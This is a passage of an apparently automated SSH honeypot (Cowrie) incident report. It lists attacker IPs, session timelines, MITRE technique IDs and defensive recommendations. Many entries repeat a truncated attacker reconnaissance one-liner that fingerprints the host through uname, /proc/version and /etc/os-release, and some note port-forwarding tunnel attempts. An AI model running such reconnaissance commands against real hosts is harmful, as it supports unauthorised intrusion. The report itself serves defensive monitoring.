| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:04:37` | `cowrie.session.connect` |
| `2026-08-03 08:04:37` | `cowrie.client.version` |
| `2026-08-03 08:04:37` | `cowrie.client.kex` |
| `2026-08-03 08:04:37` | `cowrie.login.success` |
| `2026-08-03 08:04:38` | `cowrie.session.params` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.success` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:38` | `cowrie.command.input` |
| `2026-08-03 08:04:39` | `cowrie.log.closed` |
| `2026-08-03 08:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03b7df08fd6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:06 |
| **Last Seen** | 2026-08-03 08:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:06:07` | `cowrie.session.connect` |
| `2026-08-03 08:06:07` | `cowrie.client.version` |
| `2026-08-03 08:06:08` | `cowrie.client.kex` |
| `2026-08-03 08:06:08` | `cowrie.login.success` |
| `2026-08-03 08:06:10` | `cowrie.session.params` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.success` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.command.input` |
| `2026-08-03 08:06:10` | `cowrie.log.closed` |
| `2026-08-03 08:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617c928e441c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:07 |
| **Last Seen** | 2026-08-03 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:07:38` | `cowrie.session.connect` |
| `2026-08-03 08:07:38` | `cowrie.client.version` |
| `2026-08-03 08:07:38` | `cowrie.client.kex` |
| `2026-08-03 08:07:39` | `cowrie.login.success` |
| `2026-08-03 08:07:41` | `cowrie.session.params` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.success` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.command.input` |
| `2026-08-03 08:07:41` | `cowrie.log.closed` |
| `2026-08-03 08:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c499783017d

| Field | Detail |
|---|---|
| **Source IP** | `222.76.248[.]54` |
| **First Seen** | 2026-08-03 08:07 |
| **Last Seen** | 2026-08-03 08:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:07:40` | `cowrie.session.connect` |
| `2026-08-03 08:07:43` | `cowrie.client.version` |
| `2026-08-03 08:07:43` | `cowrie.client.kex` |
| `2026-08-03 08:07:46` | `cowrie.login.success` |
| `2026-08-03 08:07:46` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.76.248[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.76.248[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a33a8c9f594

| Field | Detail |
|---|---|
| **Source IP** | `117.250.250[.]2` |
| **First Seen** | 2026-08-03 08:07 |
| **Last Seen** | 2026-08-03 08:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:07:52` | `cowrie.session.connect` |
| `2026-08-03 08:07:52` | `cowrie.client.version` |
| `2026-08-03 08:07:52` | `cowrie.client.kex` |
| `2026-08-03 08:07:54` | `cowrie.login.success` |
| `2026-08-03 08:07:55` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.250[.]2` to AbuseIPDB if not already reported
- [ ] Block `117.250.250[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55bac3da7c16

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:09 |
| **Last Seen** | 2026-08-03 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:09:10` | `cowrie.session.connect` |
| `2026-08-03 08:09:11` | `cowrie.client.version` |
| `2026-08-03 08:09:11` | `cowrie.client.kex` |
| `2026-08-03 08:09:11` | `cowrie.login.success` |
| `2026-08-03 08:09:12` | `cowrie.session.params` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.success` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.command.input` |
| `2026-08-03 08:09:12` | `cowrie.log.closed` |
| `2026-08-03 08:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ae8df439da

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:10 |
| **Last Seen** | 2026-08-03 08:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:10:56` | `cowrie.session.connect` |
| `2026-08-03 08:10:56` | `cowrie.client.version` |
| `2026-08-03 08:10:56` | `cowrie.client.kex` |
| `2026-08-03 08:10:57` | `cowrie.login.success` |
| `2026-08-03 08:10:58` | `cowrie.session.params` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.success` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.command.input` |
| `2026-08-03 08:10:58` | `cowrie.log.closed` |
| `2026-08-03 08:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e05189cbf7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:13 |
| **Last Seen** | 2026-08-03 08:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:13:04` | `cowrie.session.connect` |
| `2026-08-03 08:13:05` | `cowrie.client.version` |
| `2026-08-03 08:13:05` | `cowrie.client.kex` |
| `2026-08-03 08:13:05` | `cowrie.login.success` |
| `2026-08-03 08:13:06` | `cowrie.session.params` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.success` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.command.input` |
| `2026-08-03 08:13:06` | `cowrie.log.closed` |
| `2026-08-03 08:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb76ccf1549

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]142` |
| **First Seen** | 2026-08-03 08:14 |
| **Last Seen** | 2026-08-03 08:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:14:20` | `cowrie.session.connect` |
| `2026-08-03 08:14:20` | `cowrie.login.success` |
| `2026-08-03 08:14:21` | `cowrie.session.params` |
| `2026-08-03 08:14:21` | `cowrie.command.input` |
| `2026-08-03 08:14:21` | `cowrie.command.input` |
| `2026-08-03 08:14:21` | `cowrie.command.failed` |
| `2026-08-03 08:14:21` | `cowrie.command.input` |
| `2026-08-03 08:14:21` | `cowrie.command.failed` |
| `2026-08-03 08:14:21` | `cowrie.command.input` |
| `2026-08-03 08:14:21` | `cowrie.log.closed` |
| `2026-08-03 08:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]142` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd107a91eef1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:15 |
| **Last Seen** | 2026-08-03 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:15:59` | `cowrie.session.connect` |
| `2026-08-03 08:15:59` | `cowrie.client.version` |
| `2026-08-03 08:15:59` | `cowrie.client.kex` |
| `2026-08-03 08:15:59` | `cowrie.login.success` |
| `2026-08-03 08:16:00` | `cowrie.session.params` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.success` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.command.input` |
| `2026-08-03 08:16:00` | `cowrie.log.closed` |
| `2026-08-03 08:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896206ad4a06

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:18 |
| **Last Seen** | 2026-08-03 08:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:18:50` | `cowrie.session.connect` |
| `2026-08-03 08:18:50` | `cowrie.client.version` |
| `2026-08-03 08:18:50` | `cowrie.client.kex` |
| `2026-08-03 08:18:51` | `cowrie.login.success` |
| `2026-08-03 08:18:53` | `cowrie.session.params` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.success` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.command.input` |
| `2026-08-03 08:18:53` | `cowrie.log.closed` |
| `2026-08-03 08:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932c8e44df72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:20 |
| **Last Seen** | 2026-08-03 08:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:20:24` | `cowrie.session.connect` |
| `2026-08-03 08:20:25` | `cowrie.client.version` |
| `2026-08-03 08:20:25` | `cowrie.client.kex` |
| `2026-08-03 08:20:25` | `cowrie.login.success` |
| `2026-08-03 08:20:26` | `cowrie.session.params` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.success` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.command.input` |
| `2026-08-03 08:20:26` | `cowrie.log.closed` |
| `2026-08-03 08:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c5f5301c332

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:22 |
| **Last Seen** | 2026-08-03 08:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:22:03` | `cowrie.session.connect` |
| `2026-08-03 08:22:03` | `cowrie.client.version` |
| `2026-08-03 08:22:03` | `cowrie.client.kex` |
| `2026-08-03 08:22:04` | `cowrie.login.success` |
| `2026-08-03 08:22:05` | `cowrie.session.params` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.success` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:05` | `cowrie.command.input` |
| `2026-08-03 08:22:06` | `cowrie.log.closed` |
| `2026-08-03 08:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc1cfa232818

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:23 |
| **Last Seen** | 2026-08-03 08:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:23:34` | `cowrie.session.connect` |
| `2026-08-03 08:23:34` | `cowrie.client.version` |
| `2026-08-03 08:23:34` | `cowrie.client.kex` |
| `2026-08-03 08:23:35` | `cowrie.login.success` |
| `2026-08-03 08:23:36` | `cowrie.session.params` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
